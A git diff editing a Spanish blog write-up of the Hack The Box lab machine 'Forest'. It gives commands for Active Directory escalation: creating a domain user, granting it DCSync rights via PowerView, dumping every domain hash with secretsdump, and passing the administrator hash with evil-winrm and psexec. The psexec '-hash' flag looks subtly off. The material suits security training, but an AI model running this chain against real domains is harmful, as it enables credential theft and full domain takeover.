@@ -221,7 +221,7 @@ Import-Module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All
 ```
 
-Esto generará un archivo comprimido con toda la información del _AD_. Para descargar este archivo a nuestro equipos, utilizamos el siguiente comando:
+Esto generará un archivo comprimido con toda la información del _AD_. Para descargar este archivo a nuestro equipo, utilizaremos el siguiente comando:
 
 ```bash
 download <timestamp>_BloodHound.zip BloodHound.zip
@@ -267,7 +267,7 @@ Si nos dirigimos al apartado _Analysis_, encontraremos una sección _Shortest Pa
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"}
 
-Podemos observar que `svc-alfresco` es miembro del grupo _Service Accounts_, el cual es miembro del grupo _Privileged IT Accounts_, que a su vez es miembro del grupo _Account Operators_. Además, el grupo _Account Operators_ tiene permisos _GenericAll_ sobre el grupo _Exchange Windows Permissions_, lo que les da control total sobre este grupo. El grupo _Exchange Windows Permissions_ tiene permisos _WriteDacl_ sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (_DACL_) del dominio.
+Podemos observar que `svc-alfresco` es miembro del grupo _Service Accounts_, el cual es miembro del grupo _Privileged IT Accounts_, que a su vez es miembro del grupo _Account Operators_. Además, el grupo _Account Operators_ tiene permisos _GenericAll_ sobre el grupo _Exchange Windows Permissions_, lo que le da control total sobre este grupo. El grupo _Exchange Windows Permissions_ tiene permisos _WriteDacl_ sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (_DACL_) del dominio.
 
 Vamos por partes, el grupo _Account Operators_ otorga privilegios limitados de creación de cuentas a un usuario. Por lo tanto, el usuario `svc-alfresco` puede crear otras cuentas en el dominio. Por otra parte, el grupo _Account Operators_ tiene permisos _GenericAll_ sobre el grupo _Exchange Windows Permissions_, lo que significa que `svc-alfresco` puede modificar los permisos del grupo _Exchange Windows Permissions_. Finalmente, el grupo _Exchange Windows Permissions_ tiene permisos _WriteDacl_ sobre el dominio. Abusaremos de esto para otorgarnos privilegios de `DCSync`.
 
@@ -276,31 +276,35 @@ El ataque `DCSync` simula el comportamiento de un _Domain Controller_ y solicita
 Dicho todo esto, lo primero que haremos será aprovechar que `svc-alfresco` es miembro del grupo _Account Operators_, y crear un nuevo usuario. Para ello, haremos lo siguiente:
 
 ```bash
-net user nombreUsuario contraseña /add /domain
+net user nombreDeUsuario contraseña /add /domain
 ```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"}
 
 Lo siguiente que haremos será añadir el usuario que acabamos de crear al grupo _Exchange Windows Permissions_, aprovechando que `svc-alfresco` tiene control total sobre este grupo:
 
-```bash
-net group "Exchange Windows Permissions" nombreUsuario /add
+```powershell
+Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "nombreDeUsuario"
+```
+
+También vamos a añadir este usuario al grupo _Remote Management Users_ para que pueda conectarse a través de `Evil-WinRM`:
+
+```powershell
+Add-ADGroupMember -Identity "Remote Management Users" -Members "nombreDeUsuario"
 ```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}
 
-Finalmente, para otorgarnos permisos de `DCsync`, podemos apoyarnos en `BloodHound`, que nos da una idea de cómo realizarlo. Lo primero que haremos será descargar en nuestro equipo el script [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), que pertenece a `PowerSploit` (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante `Evil-WinRM` y posteriormente lo importaremos:
+Al añadir al usuario al grupo _Remote Management Users_, evitamos el uso de _PSCredentials_, normalmente utilizadas para ejecutar comandos con las credenciales de otro usuario, que estaban generando conflictos con `PowerView`.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}
-
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}
+A continuación, cerraremos la sesión actual de `Evil-WinRM` y nos conectaremos nuevamente con el usuario recién creado. Una vez conectados como el nuevo usuario, descargaremos en nuestro equipo el script [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), que pertenece a `PowerSploit` (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante `Evil-WinRM` y posteriormente lo importaremos:
 
 ```powershell
 upload PowerView.ps1
 Import-Module .\PowerView.ps1
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}
 
 Una vez importado, utilizaremos la función `Add-DomainObjectAcl` para otorgar permisos de `DCsync` a nuestro usuario recién creado:
 
@@ -308,15 +312,15 @@ Una vez importado, utilizaremos la función `Add-DomainObjectAcl` para otorgar p
 Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity nombreDeUsuario -Rights DCSync
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}
 
-Ya con permisos de `DCsync` en nuestro usuario, podemos utilizar `secretsdump`, otro script de la suite de `Impacket` que nos permitirá dumpear los hashes de todos los usuarios del dominio:
+Ya con permisos de `DCsync` en nuestro usuario, podemos utilizar `secretsdump`, otro script de la suite `Impacket` que nos permitirá dumpear los hashes de todos los usuarios del dominio:
 
 ```bash
-impacket-secretsdump htb.local/nombreUsuario:contraseña@10.10.10.161
+impacket-secretsdump htb.local/nombreDeUsuario:contraseña@10.10.10.161
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}
 
 Finalmente, podemos realizar un ataque de tipo `Pass the Hash`, que consiste en usar el _hash_ que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar `psexec` (otro script de `Impacket`), o bien, mediante el mismo `Evil-WinRM`:
 
@@ -324,10 +328,10 @@ Finalmente, podemos realizar un ataque de tipo `Pass the Hash`, que consiste en 
 evil-winrm -i 10.10.10.161 -u 'Administrator' -H 'HASH'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/33.png){:class="blog-image" onclick="expandImage(this)"}
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}
 
 ```bash
 impacket-psexec administrator@10.10.10.161 -hash HASH
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/34.png){:class="blog-image" onclick="expandImage(this)"}
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
